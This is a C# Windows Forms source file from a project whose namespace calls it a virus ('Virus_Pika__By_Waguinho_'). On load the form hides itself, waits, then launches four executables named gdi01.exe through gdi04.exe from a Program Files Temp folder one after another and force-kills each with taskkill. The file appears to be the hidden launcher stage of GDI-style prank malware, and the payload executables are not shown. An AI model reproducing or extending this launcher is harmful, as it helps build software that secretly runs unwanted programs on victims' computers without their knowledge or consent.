using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;


namespace Virus_Pika__By_Waguinho_
{
    public partial class gdis : Form
    {
        public gdis()
        {
            InitializeComponent();
        }

        private async void gdis_Load(object sender, EventArgs e)
        {
            
            this.Hide();
         
            await Task.Delay(30000);
            
            Process.Start(@"C:\Program Files\Temp\gdi01.exe");
            await Task.Delay(40000);
            Process.Start("taskkill", "/f /im gdi01.exe");
            await Task.Delay(5000);
            
            Process.Start(@"C:\Program Files\Temp\gdi02.exe");
            await Task.Delay(40000);
            Process.Start("taskkill", "/f /im gdi02.exe");
            await Task.Delay(5000);

            Process.Start(@"C:\Program Files\Temp\gdi03.exe");
            await Task.Delay(40000);
            Process.Start("taskkill", "/f /im gdi03.exe");
            await Task.Delay(5000);

            Process.Start(@"C:\Program Files\Temp\gdi04.exe");
            Process.Start("taskkill", "/f /im gdi04.exe");
            await Task.Delay(5000);

        }
    }
}
